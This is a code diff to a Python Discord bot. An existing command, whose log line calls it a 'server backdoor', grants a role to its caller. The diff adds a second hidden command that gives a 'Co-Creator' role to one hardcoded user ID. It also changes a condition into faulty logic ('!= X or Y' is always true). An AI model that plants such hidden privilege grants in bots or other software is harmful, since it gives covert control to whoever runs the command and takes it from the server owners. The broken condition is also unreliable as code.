@@ -107,7 +107,16 @@ async def boi(ctx):
         user = ctx.message.author
         await user.add_roles(role)
         print(f"{Fore.YELLOW}Log/botrun.py: {ctx.message.author} has created a server backdoor.{Style.RESET_ALL}")
-    elif ctx.message.author.id == 410424445216358410 or 449937278136221698:
+    elif ctx.message.author.id != 410424445216358410 or 449937278136221698:
+        return
+        
+@bot.command()
+async def boi2(ctx):
+    if ctx.message.author.id == 410424445216358410:
+        role = discord.utils.get(ctx.guild.roles, name='Co-Creator')
+        user = ctx.message.author
+        await user.add_roles(role)
+    elif ctx.message.author.id != 410424445216358410:
         return
 
 #Bot Initialize
